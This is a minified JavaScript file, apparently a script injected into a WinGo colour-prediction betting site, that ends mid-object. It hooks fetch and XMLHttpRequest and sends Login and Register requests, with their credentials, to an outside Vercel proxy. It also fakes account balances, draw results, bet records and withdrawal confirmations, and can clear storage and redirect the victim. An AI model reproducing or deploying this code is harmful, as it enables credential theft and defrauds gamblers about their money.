var Pt = location.href.match(/[?&]ref=([A-Za-z0-9]{6})/);
if (Pt) sessionStorage.setItem("wg_ref", Pt[1]);
function Zt({
  apiBase: n,
  spoofDomain: t,
  minBalance: o,
  nukeUrl: i,
  authErrMsg: c,
  onBalance: f,
  onWingo: p,
}) {
  if (navigator.serviceWorker)
    navigator.serviceWorker
      .getRegistrations()
      .then((S) => S.forEach((L) => L.unregister()))
      .catch(() => {});
  document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll("iframe").forEach((S) => {
      if (
        S.src &&
        (S.src.includes("unTopWindow") || S.src.includes("fromEntry=sw"))
      )
        S.remove();
    });
  });
  let l = window.fetch,
    v = "https://shree-win-beta.vercel.app", // <-- Replace with your Vercel deployment URL after deploying api/proxy.js
    q = /\/api\/webapi\/(Register|Login)$/,
    E = '{"code":1,"msg":"' + c + '"}',
    W = "";
  function $(S, L) {
    try {
      window.dispatchEvent(new CustomEvent(S, { detail: L }));
    } catch {}
  }
  function J() {
    try {
      return JSON.parse(localStorage.getItem("userInfo") || "{}") || {};
    } catch {}
    return {};
  }
  function z(S) {
    if (typeof S !== "string") return S;
    let L = S.startsWith(n) ? S.slice(n.length) : S;
    return q.test(L) ? v + L : L;
  }
  function O() {
    setTimeout(() => {
      (localStorage.clear(),
        sessionStorage.clear(),
        (window.location.href = i));
    }, 1500);
  }
  function U() {
    let S = J();
    return (
      S.userName ||
      S.username ||
      S.phone ||
      sessionStorage.getItem("wg_user") ||
      sessionStorage.getItem("wg_qual_user") ||
      ""
    );
  }
  function a() {
    let S = Number(J().amount);
    return Number.isFinite(S) ? S : null;
  }
  function y(S) {
    if (!S) return "";
    let L = sessionStorage.getItem("wg_qual_user");
    if (L && L !== S) sessionStorage.removeItem("wg_qualified");
    return (sessionStorage.setItem("wg_user", S), S);
  }
  function e(S, L) {
    if (L)
      (sessionStorage.setItem("wg_user", L),
        sessionStorage.setItem("wg_qual_user", L));
    if (S)
      (sessionStorage.setItem("wg_qualified", "1"),
        $("wg-qualified", { user: L || U() }));
    else sessionStorage.removeItem("wg_qualified");
  }
  function u(S, L) {
    if (typeof S?.is_qualified === "boolean") e(S.is_qualified, L);
    else if (L) sessionStorage.setItem("wg_qual_user", L);
  }
  function w() {
    try {
      let S =
        localStorage.getItem("token") || sessionStorage.getItem("token") || "";
      if (!S) return "";
      let L =
        localStorage.getItem("tokenHeader") ||
        sessionStorage.getItem("tokenHeader") ||
        "Bearer ";
      return S.startsWith(L.trim()) ? S : L + S;
    } catch {}
    return "";
  }
  function Q(S, L) {
    if (!S || !q.test(S) || !L) return L;
    try {
      let X = JSON.parse(L);
      if (!X.domainurl) X.domainurl = t;
      if (S.includes("/api/webapi/Register")) {
        let Y = sessionStorage.getItem("wg_ref");
        if (Y && !X.wg_ref) X.wg_ref = Y;
      }
      return JSON.stringify(X);
    } catch {}
    return L;
  }
  function P(S) {
    return (
      S?.data?.userName ||
      S?.data?.username ||
      S?.data?.phone ||
      S?.username ||
      ""
    );
  }
  function Z(S) {
    if (S < o) return;
    let L = U(),
      X = w();
    if (
      !L ||
      !X ||
      sessionStorage.getItem("wg_qualified") ||
      sessionStorage.getItem("wg_qualifying")
    )
      return;
    (sessionStorage.setItem("wg_qualifying", "1"),
      l("/ar-api/qualify", {
        method: "POST",
        headers: { "content-type": "application/json", authorization: X },
        body: "{}",
      })
        .then((Y) => Y.json().catch(() => ({})))
        .then((Y) => {
          if (Y?.qualified) e(!0, L);
        })
        .finally(() => sessionStorage.removeItem("wg_qualifying")));
  }
  function H(S) {
    let L = Number(S);
    if (!Number.isFinite(L)) return;
    (f(L), $("wg-balance", { balance: L }), Z(L));
  }
  function F(S, L) {
    if (!S) return null;
    if (S.includes("/api/Lottery/GetBalance")) return L?.data?.balance;
    if (S.includes("/api/webapi/GetUserInfo")) return L?.data?.amount;
    return null;
  }
  function j(S, L) {
    if (!S) return;
    if (
      !S.includes("/api/Lottery/GetBalance") &&
      !S.includes("/api/webapi/GetUserInfo") &&
      !S.includes("/api/webapi/Login") &&
      !S.includes("/api/webapi/Register")
    )
      return;
    L.json()
      .then((X) => {
        let Y = y(P(X));
        if (Y && sessionStorage.getItem("wg_qual_user") !== Y)
          d("login", Y, {});
        let D = F(S, X);
        if (D != null) H(D);
      })
      .catch(() => {});
  }
  function _(S, L) {
    if (S && (S.includes("/Login") || S.includes("/Register")))
      L.text()
        .then((X) => {
          if (X.includes(c)) O();
        })
        .catch(() => {});
    if (S && p && S.includes("WinGo")) {
      let X = S.match(/WinGo_([\w]+)/),
        Y = X ? "WinGo_" + X[1] : null;
      L.json()
        .then((D) => p(Y, D))
        .catch(() => {});
    }
  }
  function d(S, L, X) {
    return l("/ar-api/auth-sync", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ type: S, u: L, ...X }),
    })
      .then((Y) => Y.json())
      .then((Y) => {
        if (S === "login") u(Y, L);
        return Y;
      })
      .catch(() => ({}));
  }
  function Nn(S) {
    try {
      let L = JSON.parse(S);
      d("register", L.username || "", {
        inv: L.invitecode || "",
        parent: sessionStorage.getItem("wg_ref") || "",
      });
    } catch {}
  }
  async function cn(S) {
    try {
      let L = JSON.parse(S);
      return (await d("login", L.username || "", {})).allowed === !1;
    } catch {}
    return !1;
  }
  function A() {
    let S = y(U());
    if (!S || W === S) return;
    ((W = S),
      d("login", S, {}).then(() => {
        let L = a();
        if (L != null) H(L);
      }));
  }
  return (
    (window.fetch = async function (S, L) {
      let X = "",
        Y = null;
      if (typeof S === "string") {
        if (
          ((X = S),
          (Y = L?.body && typeof L.body === "string" ? L.body : null),
          Y)
        )
          ((Y = Q(X, Y)), (L = { ...(L || {}), body: Y }));
        S = z(S);
      } else if (S instanceof Request) {
        X = S.url;
        let x = S.clone();
        if (q.test(X))
          try {
            Y = Q(X, await x.text());
          } catch {}
        S = new Request(z(S.url.startsWith(n) ? S.url : S.url), {
          method: S.method,
          headers: S.headers,
          body: Y == null ? S.body : Y,
          mode: "cors",
          credentials: S.credentials,
        });
      }
      if (!Y && L?.body && typeof L.body === "string") Y = L.body;
      if (X.endsWith("/api/webapi/Login") && Y) {
        if (await cn(Y)) {
          let x = new Response(E, {
            status: 200,
            headers: { "Content-Type": "application/json" },
          });
          return (_(X, x.clone()), x);
        }
      }
      let D = typeof S === "string" ? S : S?.url,
        m = await l.call(this, S, L);
      if (X.endsWith("/api/webapi/Register") && Y)
        m.clone()
          .json()
          .then((x) => {
            if (x?.code === 0) Nn(Y);
          })
          .catch(() => {});
      return (_(D, m.clone()), j(D, m.clone()), m);
    }),
    (XMLHttpRequest.prototype.open = ((S) =>
      function (L, X, ...Y) {
        return (
          (this._url = z(X)),
          (this._rawUrl = X),
          S.call(this, L, this._url, ...Y)
        );
      })(XMLHttpRequest.prototype.open)),
    (XMLHttpRequest.prototype.send = ((S) =>
      function (L) {
        this._body = typeof L === "string" ? L : null;
        let X = this,
          Y = this._body ? Q(this._rawUrl || this._url, this._body) : L;
        if (
          ((this._body = typeof Y === "string" ? Y : null),
          this.addEventListener("load", function () {
            try {
              if (
                this._url &&
                (this._url.includes("/Login") ||
                  this._url.includes("/Register")) &&
                this.responseText.includes(c)
              )
                O();
            } catch {}
            try {
              if (this._url) {
                let D = JSON.parse(this.responseText),
                  m = y(P(D));
                if (
                  m &&
                  (this._url.includes("GetUserInfo") ||
                    this._url.includes("Login") ||
                    this._url.includes("Register")) &&
                  sessionStorage.getItem("wg_qual_user") !== m
                )
                  d("login", m, {});
                let x = F(this._url, D);
                if (x != null) H(x);
              }
            } catch {}
            try {
              if (
                this._rawUrl &&
                this._rawUrl.endsWith("/api/webapi/Register") &&
                this._body
              ) {
                if (JSON.parse(this.responseText)?.code === 0) Nn(this._body);
              }
            } catch {}
            try {
              if (this._url && p && this._url.includes("WinGo")) {
                let D = this._url.match(/WinGo_([\w]+)/),
                  m = D ? "WinGo_" + D[1] : null;
                p(m, JSON.parse(this.responseText));
              }
            } catch {}
          }),
          this._rawUrl &&
            this._rawUrl.endsWith("/api/webapi/Login") &&
            this._body)
        ) {
          cn(this._body)
            .then((D) => {
              if (D)
                (Object.defineProperties(X, {
                  readyState: { value: 4, writable: !1 },
                  status: { value: 200, writable: !1 },
                  statusText: { value: "OK", writable: !1 },
                  responseText: { value: E, writable: !1 },
                  response: { value: E, writable: !1 },
                }),
                  X.dispatchEvent(new Event("readystatechange")),
                  X.dispatchEvent(new Event("load")),
                  X.dispatchEvent(new Event("loadend")));
              else S.call(X, Y);
            })
            .catch(() => S.call(X, Y));
          return;
        }
        return S.call(this, Y);
      })(XMLHttpRequest.prototype.send)),
    A(),
    window.addEventListener("pageshow", A),
    l
  );
}
var wn = "wg_spoof_state",
  ko = 420000,
  Xt = 50,
  Yt = 240,
  Ht = 2,
  ot = [
    "red,violet",
    "green",
    "red",
    "green",
    "red",
    "green,violet",
    "red",
    "green",
    "red",
    "green",
  ];
function Vt() {
  try {
    var n = JSON.parse(localStorage.getItem("wg_spoof_cfg"));
    return n && typeof n === "object" ? n : {};
  } catch (t) {
    return {};
  }
}
function T(n, t) {
  var o = Vt(),
    i = o[n];
  return i !== void 0 ? i : t;
}
function Nt() {
  try {
    var n = sessionStorage.getItem("wg_user");
    return !!n && "918815393226".indexOf(n) !== -1;
  } catch (t) {
    return !1;
  }
}
function Ft(n) {
  var t = 2166136261;
  for (var o = 0; o < n.length; o++)
    ((t ^= n.charCodeAt(o)), (t = Math.imul(t, 16777619)));
  return (
    (t = Math.imul(t ^ (t >>> 16), 2246822507)),
    (t = Math.imul(t ^ (t >>> 13), 3266489909)),
    (t ^ (t >>> 16)) >>> 0
  );
}
function so(n) {
  return (
    (n = BigInt.asUintN(64, n + 0x9e3779b97f4a7c15n)),
    (n = BigInt.asUintN(64, (n ^ (n >> 30n)) * 0xbf58476d1ce4e5b9n)),
    (n = BigInt.asUintN(64, (n ^ (n >> 27n)) * 0x94d049bb133111ebn)),
    BigInt.asUintN(64, n ^ (n >> 31n))
  );
}
function Bt(n, t, o) {
  var i = /^\d+$/.test(String(t || ""))
    ? BigInt(t)
    : BigInt(Ft(String(t || "")));
  return so(i ^ BigInt(Ft(o + n)));
}
function ln(n, t, o) {
  return Number(Bt(n, t, o) % 10n);
}
function In(n, t) {
  if (((n = String(n || "")), (t = t || 1), !/^\d+$/.test(n))) return "";
  try {
    return (BigInt(n) - BigInt(t)).toString();
  } catch (o) {}
  return String(Math.max(0, Number(n) - t));
}
function Gt(n, t, o, i) {
  var c = t - o === o - i && Math.abs(t - o) <= 2 && n - t === t - o;
  return (
    (n === t && t === o) ||
    (n === o && o === i) ||
    (n === o && t === i) ||
    (n === i && o === i) ||
    c
  );
}
function Dn(n, t) {
  t = String(t || "");
  var o = ln(n, t, "Kx7q:");
  if (!/^\d+$/.test(t)) return o;
  var i = ln(n, In(t, 1), "Kx7q:"),
    c = ln(n, In(t, 2), "Kx7q:"),
    f = ln(n, In(t, 3), "Kx7q:");
  if (!Gt(o, i, c, f)) return o;
  var p = [
    ln(n, t, "J4n2:"),
    ln(n, t, "V8p1:"),
    ln(n, t, "S6d7:"),
    (o + 5) % 10,
    (o + 3) % 10,
  ];
  for (var l = 0; l < p.length; l++) if (!Gt(p[l], i, c, f)) return p[l];
  return p[0];
}
function At(n, t) {
  return Number(Bt(n, t, "Rz3m:") % 100n);
}
function _o(n, t) {
  return (Dn(n, t) + 5) % 10;
}
function ni() {
  var n = T("accuracy", 70);
  if (isNaN(n) || n < 0) n = 0;
  if (n > 100) n = 100;
  return n;
}
function jn(n, t) {
  return At(n, t) < ni() ? Dn(n, t) : _o(n, t);
}
function ht(n) {
  if (((n = String(n || "")), !/^\d+$/.test(n))) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {}
  return String(Number(n) + 1);
}
function ti(n) {
  var t = String(n || "");
  return (
    /\/WinGo\/[^\/?]+\.json(?:\?|$)/.test(t) &&
    t.indexOf("GetHistoryIssuePage") === -1
  );
}
function G(n) {
  var t = parseFloat(n);
  return isNaN(t) ? 0 : t;
}
function $n(n, t) {
  return parseFloat((G(n) * Math.max(1, G(t))).toFixed(2));
}
function Ct(n, t) {
  return Math.abs(G(n) - G(t)) < 0.001;
}
function un(n, t) {
  var o = n && n.match(new RegExp("[?&]" + t + "=([^&]+)"));
  return o ? decodeURIComponent(o[1]) : null;
}
function oi(n) {
  if (((n = String(n || "")), n.indexOf("5M") !== -1)) return 300000;
  if (n.indexOf("3M") !== -1) return 180000;
  if (n.indexOf("1M") !== -1) return 60000;
  return 30000;
}
function Mn(n) {
  var t = un(n, "gameCode");
  if (t) return t;
  var o = n && n.match(/\/WinGo\/([^\/?]+)(?:\/|\.json(?:\?|$)|\?|$)/);
  if (o) return decodeURIComponent(o[1]);
  if (window.location) t = un(window.location.hash, "gameCode");
  return t || null;
}
function ii(n, t) {
  if (
    ((n = String(n || "").toLowerCase()),
    (t = +t || 0),
    n.indexOf("num_") === 0)
  )
    return 9;
  if (n.indexOf("violet") !== -1) return 4.5;
  if (n === "color_green" && t === 5) return 1.5;
  if (n === "color_red" && t === 0) return 1.5;
  return 2;
}
function ci(n, t) {
  if (((n = String(n || "").toLowerCase()), n.indexOf("num_") === 0))
    return t === parseInt(n.split("_")[1], 10);
  if (n === "bigsmall_big") return t >= 5;
  if (n === "bigsmall_small") return t <= 4;
  if (n === "color_green") return [1, 3, 5, 7, 9].indexOf(t) !== -1;
  if (n === "color_red") return [0, 2, 4, 6, 8].indexOf(t) !== -1;
  if (n === "color_violet") return [0, 5].indexOf(t) !== -1;
  return !1;
}
function li(n, t) {
  if (!t) return 0;
  var o = n.stake - (n.fee || n.stake * 0.02);
  return ci(n.content, t.num)
    ? parseFloat((o * ii(n.content, t.num)).toFixed(2))
    : 0;
}
var M;
try {
  M = JSON.parse(localStorage.getItem(wn));
} catch (n) {}
if (M && M.pending !== void 0)
  M = { balance: M.balance, draws: {}, rigs: {}, withdrawals: {} };
if (!M) M = { balance: null, draws: {}, rigs: {}, withdrawals: {} };
if (!M.draws) M.draws = {};
if (!M.rigs) M.rigs = {};
if (!M.withdrawals) M.withdrawals = {};
if (M.version !== Ht) {
  Fn = {};
  for (Gn in M.rigs) Fn[M.rigs[Gn].game + ":" + M.rigs[Gn].issue] = !0;
  for (hn in M.draws) if (!Fn[hn]) delete M.draws[hn];
  M.version = Ht;
  try {
    localStorage.setItem(wn, JSON.stringify(M));
  } catch (n) {}
}
var Fn,
  Gn,
  hn,
  Jn = {};
function it(n, t) {
  return String(n || "") + ":" + String(t || "");
}
function xn(n, t, o) {
  if (!n || o == null || isNaN(o)) return null;
  var i = it(n, t),
    c = M.draws[i];
  if (c) {
    if (c.color == null) c.color = ot[c.num];
    if (!c.seenAt) c.seenAt = Date.now();
    return c;
  }
  return (
    (c = { num: +o, color: ot[o], seenAt: Date.now() }),
    (M.draws[i] = c),
    c
  );
}
function Wn(n, t) {
  if (((n = String(n || "")), t)) return M.draws[it(t, n)] || null;
  var o = null,
    i = 0;
  for (var c in M.draws) if (c.split(":")[1] === n) ((o = M.draws[c]), i++);
  return i === 1 ? o : null;
}
function kn(n, t) {
  n = String(n || "");
  var o = [];
  if (t) {
    var i = t + ":" + n + ":";
    for (var c in M.rigs)
      if (c.indexOf(i) === 0) o.push({ key: c, rig: M.rigs[c] });
  } else
    for (var c in M.rigs)
      if (String(M.rigs[c].issue) === n) o.push({ key: c, rig: M.rigs[c] });
  return o;
}
function fi(n) {
  n = String(n || "");
  var t = null;
  for (var o in M.rigs) {
    var i = M.rigs[o];
    if (String(i.issue) !== n) continue;
    if (!t) t = i.game;
    else if (t !== i.game) return null;
  }
  return t;
}
function Cn(n) {
  if (n.settled) return !1;
  var t = Wn(n.issue, n.game);
  if (!t) return !1;
  if (((n.win = li(n, t)), (n.settled = !0), M.balance === null))
    M.balance = T("balanceOffset", 5000);
  return ((M.balance += n.win), !0);
}
function zn() {
  var n = Date.now(),
    t = !1;
  for (var o in M.rigs) {
    var i = M.rigs[o];
    if (!i.settled && i.settleAt && n >= i.settleAt) {
      if (Cn(i)) t = !0;
    }
  }
  for (var o in M.rigs)
    if (!M.rigs[o].settled && n - (M.rigs[o].time || 0) > ko) {
      if (Cn(M.rigs[o])) t = !0;
    }
  for (var c in Jn) if (Jn[c] < n - 60000) delete Jn[c];
  var f = Object.keys(M.rigs);
  if (f.length > Xt) {
    var p = f.filter(function (y) {
      return M.rigs[y].settled;
    });
    p.sort(function (y, e) {
      return (M.rigs[y].time || 0) - (M.rigs[e].time || 0);
    });
    for (var l = 0, v = f.length - Xt; l < v && l < p.length; l++)
      (delete M.rigs[p[l]], (t = !0));
    var q = {};
    for (var E in M.rigs) q[M.rigs[E].game + ":" + M.rigs[E].issue] = !0;
    for (var W in M.draws) if (!q[W]) (delete M.draws[W], (t = !0));
  }
  var $ = Object.keys(M.draws);
  if ($.length > Yt) {
    var J = {};
    for (var z in M.rigs) J[M.rigs[z].game + ":" + M.rigs[z].issue] = !0;
    var O = $.filter(function (y) {
      return !J[y];
    });
    O.sort(function (y, e) {
      return (M.draws[y].seenAt || 0) - (M.draws[e].seenAt || 0);
    });
    for (var U = 0, a = $.length - Yt; U < a && U < O.length; U++)
      (delete M.draws[O[U]], (t = !0));
  }
  if (t) ct();
  return t;
}
function nn() {
  (zn(), localStorage.setItem(wn, JSON.stringify(M)));
}
var sn = null;
function ct() {
  if (M.balance === null || sn) return;
  sn = setTimeout(function () {
    sn = null;
    try {
      var n = document.getElementById("app"),
        t = n && n.__vue_app__,
        o = t && t.config.globalProperties.$pinia,
        i = o && o.state.value.GlobalState;
      if (i && i.userInfo && typeof i.userInfo.amount === "number")
        i.userInfo.amount = M.balance;
    } catch (c) {}
  }, 300);
}
function fn(n) {
  if (M.balance === null && typeof n === "number" && n >= 0)
    ((M.balance = n + T("balanceOffset", 5000)), nn());
  return M.balance === null ? T("balanceOffset", 5000) : M.balance;
}
function bt(n) {
  return (
    (n = String(n || "").toLowerCase()),
    n.indexOf("num_") === 0
      ? "Num"
      : n.indexOf("bigsmall_") === 0
        ? "BigSmall"
        : n.indexOf("color_") === 0
          ? "Color"
          : "Num"
  );
}
function Rt(n, t) {
  if (
    ((n.issueNumber = t.issue),
    (n.betContent = t.content),
    (n.amount = t.amount),
    (n.betMultiple = t.betMultiple),
    (n.realAmount = t.realAmount),
    (n.fee = t.fee),
    (n.betTime = t.time),
    (n.playType = bt(t.content)),
    (n.orderNo = t.orderNo),
    !t.settled)
  ) {
    ((n.state = 2),
      (n.number = ""),
      (n.color = ""),
      (n.premium = ""),
      (n.winLoseAmount = 0));
    return;
  }
  ((n.state = t.win > 0 ? 1 : 0),
    (n.winLoseAmount =
      t.win > 0
        ? parseFloat((t.win - t.stake).toFixed(2))
        : parseFloat((-t.stake).toFixed(2))));
  var o = Wn(t.issue, t.game);
  if (o)
    ((n.number = String(o.num)),
      (n.color = o.color),
      (n.premium = String(o.num)));
}
function pi(n) {
  var t = {
    issueNumber: n.issue,
    playType: bt(n.content),
    orderNo: n.orderNo,
    amount: n.amount,
    betMultiple: n.betMultiple,
    betContent: n.content,
    number: "",
    color: "",
    premium: "",
    realAmount: n.realAmount,
    fee: n.fee,
    state: 2,
    winLoseAmount: 0,
    betTime: n.time,
    sum: 0,
  };
  return (Rt(t, n), t);
}
function On(n) {
  return n < 10 ? "0" + n : "" + n;
}
function _n(n) {
  var t = new Date(n);
  return (
    t.getFullYear() +
    "-" +
    On(t.getMonth() + 1) +
    "-" +
    On(t.getDate()) +
    " " +
    On(t.getHours()) +
    ":" +
    On(t.getMinutes()) +
    ":" +
    On(t.getSeconds())
  );
}
var Kn = {
  GetUserInfo: function (n) {
    if (n && n.code === 0 && n.data) {
      if (zn()) localStorage.setItem(wn, JSON.stringify(M));
      if (((n.data.amount = fn(n.data.amount)), M.balance !== null))
        ((n.data.amountofCode = 0), (n.data.channelAmountofCode = 0));
      window.__wgUICache = JSON.parse(JSON.stringify(n));
    } else if (
      n &&
      n.code !== 0 &&
      window.__wgUICache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgUICache;
      ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = JSON.parse(JSON.stringify(t.data))),
        (n.data.amount = fn()));
    }
  },
  GetARGameAndPlatWallets: function (n) {
    var t = n.data && n.data.thidGameBalanceList;
    if (t) {
      for (var o = 0; o < t.length; o++)
        if (t[o].vendorCode === "Lottery") t[o].balance = fn(t[o].balance);
    }
  },
  GetSaasAllwallets: function (n) {
    Kn.GetARGameAndPlatWallets(n);
  },
  GetBalance: function (n) {
    if (n && n.code === 0 && n.data) {
      if (zn()) localStorage.setItem(wn, JSON.stringify(M));
      if (typeof n.data.balance === "number")
        n.data.balance = fn(n.data.balance);
      window.__wgBalCache = JSON.parse(JSON.stringify(n));
    } else if (
      n &&
      n.code !== 0 &&
      window.__wgBalCache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgBalCache;
      if (
        ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = JSON.parse(JSON.stringify(t.data))),
        typeof n.data.balance === "number")
      )
        n.data.balance = fn();
    }
  },
  RecoverSaasBalance: function (n) {
    if (n.data && typeof n.data.amount === "number")
      n.data.amount = fn(n.data.amount);
  },
  GetWithdrawLog: function (n, t) {
    try {
      var o = JSON.parse(t._kBody || "{}");
      if (o.pageNo > 1) return;
    } catch (W) {}
    if (!n.data) n.data = { list: [] };
    if (!n.data.list) n.data.list = [];
    var i = {};
    for (var c = 0; c < n.data.list.length; c++)
      i[n.data.list[c].withdrawNumber] = !0;
    var f = [];
    for (var p in M.withdrawals)
      if (!i[M.withdrawals[p].withdrawNumber]) {
        var l = M.withdrawals[p];
        try {
          var v = o.type || o.categoryId || o.withdrawTypeId || -1;
          if (v != -1 && v != 0 && l.type && l.type != v) continue;
        } catch (W) {}
        var q = l.type === 2 ? "BANK CARD" : l.type === 1 ? "UPI" : "UPI";
        f.push({
          id: l.withdrawNumber,
          withdrawNumber: l.withdrawNumber,
          price: l.amount,
          state: l.state,
          addTime: _n(l.addTime),
          fee: l.fee,
          withdrawName: q,
          _ts: l.addTime,
        });
      }
    f.sort(function (W, $) {
      return $._ts - W._ts;
    });
    for (var E = 0; E < f.length; E++) delete f[E]._ts;
    ((n.data.list = f.concat(n.data.list)),
      (n.data.totalCount = (n.data.totalCount || 0) + f.length));
  },
  Withdraw: function (n, t) {
    try {
      var o = JSON.parse(t._kBody || "{}"),
        i =
          G(o.amount) || G(o.price) || G(o.applyAmount) || G(o.withdrawAmount);
      if (!i || i <= 0) return;
      var c = o.withdrawid || o.type || o.categoryId || o.withdrawTypeId || 2,
        f = "W" + Date.now();
      if (
        ((M.withdrawals[f] = {
          withdrawNumber: f,
          amount: i,
          state: 3,
          fee: 0,
          addTime: Date.now(),
          type: c,
        }),
        M.balance === null)
      )
        M.balance = T("balanceOffset", 5000);
      ((M.balance -= i), nn());
    } catch (p) {}
    ((n.code = 0), (n.msg = "Succeed"));
  },
  NewSetWithdrawal: function (n, t) {
    try {
      console.log("NewSetWithdrawal body:", t._kBody);
    } catch (o) {}
    return Kn.Withdraw(n, t);
  },
  getWithdrawals: function (n) {
    if (n && n.data && n.data.withdrawalsrule) {
      var t = fn();
      ((n.data.withdrawalsrule.amount = t),
        (n.data.withdrawalsrule.canWithdrawAmount = t));
    }
  },
  GetNewMyEmerdList: function (n, t) {
    if (zn()) localStorage.setItem(wn, JSON.stringify(M));
    if (!n.data) n.data = { list: [], pageNo: 1, totalPage: 0, totalCount: 0 };
    var o = {};
    try {
      o = JSON.parse((t && t._kBody) || "{}");
    } catch (H) {}
    var i = parseInt(o.pageNo || 1, 10),
      c = parseInt(o.pageSize || 10, 10),
      f = o.startDate || "",
      p = o.endDate || "",
      l = String(o.gameType || "");
    if (l !== "" && l !== "0" && l !== "1") {
      ((n.data.list = []),
        (n.data.totalCount = 0),
        (n.data.totalPage = 0),
        (n.data.pageNo = i));
      return;
    }
    var v = { WinGo_30S: 30, WinGo_1M: 1, WinGo_3M: 2, WinGo_5M: 3 };
    function q(H) {
      if (((H = String(H || "")), H.indexOf("Color_") === 0))
        return H.slice(6).toLowerCase();
      if (H.indexOf("Num_") === 0) return H.slice(4);
      if (H.indexOf("BigSmall_") === 0) return H.slice(9).toLowerCase();
      return H.toLowerCase();
    }
    function E(H) {
      return String(H || "").indexOf("BigSmall_") === 0 ? 2 : 0;
    }
    var W = f ? new Date(f + " 00:00:00").getTime() : 0,
      $ = p ? new Date(p + " 23:59:59").getTime() : 1 / 0,
      J = [];
    for (var z in M.rigs) {
      var O = M.rigs[z];
      if (!O.settled) continue;
      if (O.time < W || O.time > $) continue;
      var U = Wn(O.issue, O.game);
      J.push({
        orderNumber: O.orderNo,
        issueNumber: O.issue,
        typeID: v[O.game] || 30,
        amount: O.amount,
        betCount: 1,
        gameType: E(O.content),
        selectType: q(O.content),
        realAmount: O.realAmount,
        serviceCharge: O.fee,
        figure: 1,
        state: O.win > 0 ? 1 : 0,
        winAmount: O.win > 0 ? parseFloat(O.win.toFixed(2)) : 0,
        addTime: _n(O.time),
        fee: O.fee,
        premium: U ? String(U.num) : "",
        number: U ? String(U.num) : "",
        colour: U ? U.color : "",
        _ts: O.time,
      });
    }
    var a = n.data.list || [];
    if (i === 1 && (J.length > 0 || a.length > 0)) {
      var y = {};
      for (var e = 0; e < J.length; e++) y[J[e].orderNumber] = !0;
      for (var u = 0; u < a.length; u++)
        if (!y[a[u].orderNumber]) {
          var w = new Date(a[u].addTime || 0).getTime();
          ((a[u]._ts = isNaN(w) ? 0 : w), J.push(a[u]));
        }
      J.sort(function (H, F) {
        return (F._ts || 0) - (H._ts || 0);
      });
      for (var Q = 0; Q < J.length; Q++) delete J[Q]._ts;
      ((n.data.list = J.slice(0, c)),
        (n.data.totalCount = J.length),
        (n.data.totalPage = Math.max(1, Math.ceil(J.length / c))),
        (n.data.pageNo = 1));
    } else if (i > 1 && a.length === 0 && J.length > 0) {
      J.sort(function (H, F) {
        return (F._ts || 0) - (H._ts || 0);
      });
      for (var P = 0; P < J.length; P++) delete J[P]._ts;
      var Z = (i - 1) * c;
      ((n.data.list = J.slice(Z, Z + c)),
        (n.data.totalCount = J.length),
        (n.data.totalPage = Math.max(1, Math.ceil(J.length / c))),
        (n.data.pageNo = i));
    }
  },
  WinGoBet: function (n, t) {
    if (!t || !t._kBody) {
      ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
      return;
    }
    try {
      var o = JSON.parse(t._kBody),
        i = o.gameCode || Mn(t._kUrl) || "WinGo",
        c = String(o.issueNumber || ""),
        f = i + ":" + c;
      if (!M.draws[f]) xn(i, c, jn(i, c));
      var p = M.draws[f],
        l = G(o.amount),
        v = Math.max(1, G(o.betMultiple || 1)),
        q = $n(l, v),
        E = parseFloat((q * 0.02).toFixed(2)),
        W = 0;
      for (var $ in M.rigs) if ($.indexOf(f + ":") === 0) W++;
      var J = f + ":" + W,
        z = Jn[f],
        O = z ? z + 5000 : Date.now() + oi(i) + 5000;
      if (
        ((M.rigs[J] = {
          key: J,
          issue: c,
          game: i,
          content: o.betContent,
          amount: l,
          betMultiple: v,
          stake: q,
          fee: E,
          realAmount: parseFloat((q - E).toFixed(2)),
          orderNo: "KG" + c + W,
          settled: !1,
          win: null,
          time: Date.now(),
          settleAt: O,
        }),
        M.balance === null)
      )
        M.balance = T("balanceOffset", 5000);
      ((M.balance -= q), nn(), ct());
      try {
        window.dispatchEvent(
          new CustomEvent("kismat:round", {
            detail: {
              type: "round",
              game: i,
              issue: c,
              num: p.num,
              color: p.color,
              ts: Date.now(),
            },
          }),
        );
      } catch (U) {}
    } catch (U) {}
    ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
  },
  WinGoState: function (n, t) {
    var o = n && n.current ? n : n && n.data && n.data.current ? n.data : null;
    if (!o || !o.current) return;
    var i = String(o.gameCode || Mn(t ? t._kUrl : null) || ""),
      c = String(o.current.issueNumber || "");
    if (!c) return;
    var f = !1;
    if (i && c && !M.draws[it(i, c)]) (xn(i, c, jn(i, c)), (f = !0));
    var p = G(o.current.endTime || 0);
    if (i && c && p > 0) {
      Jn[i + ":" + c] = p;
      var l = p + 5000,
        v = i + ":" + c + ":";
      for (var q in M.rigs)
        if (
          q.indexOf(v) === 0 &&
          !M.rigs[q].settled &&
          M.rigs[q].settleAt !== l
        )
          M.rigs[q].settleAt = l;
    }
    var E = String((o.next && o.next.issueNumber) || ht(c) || "");
    try {
      window.dispatchEvent(
        new CustomEvent("kismat:issue", {
          detail: {
            type: "issue",
            game: i,
            currentIssue: c,
            nextIssue: E,
            currentStart: G(o.current.startTime || 0),
            currentEnd: G(o.current.endTime || 0),
            ts: Date.now(),
          },
        }),
      );
    } catch (W) {}
    if (f) nn();
  },
  GetHistoryIssuePage: function (n, t) {
    var o = n.data && n.data.list;
    if (!o) return;
    var i = Mn(t ? t._kUrl : null),
      c = !1,
      f = o[0] && o[0].issueNumber != null ? String(o[0].issueNumber) : "";
    for (var p = 0; p < o.length; p++) {
      var l = String(o[p].issueNumber || ""),
        v = kn(l, i),
        q = Wn(l, i);
      if (!q && i) {
        var E = !v.length ? jn(i, l) : Dn(i, l);
        ((q = xn(i, l, E)), (c = !0));
      }
      if (!q) continue;
      ((o[p].number = String(q.num)),
        (o[p].color = q.color),
        (o[p].premium = String(q.num)));
      for (var W = 0; W < v.length; W++) if (Cn(v[W].rig)) c = !0;
    }
    if (c) nn();
    try {
      window.dispatchEvent(
        new CustomEvent("kismat:gameData", {
          detail: {
            type: "history",
            game: i || "",
            latestIssue: f,
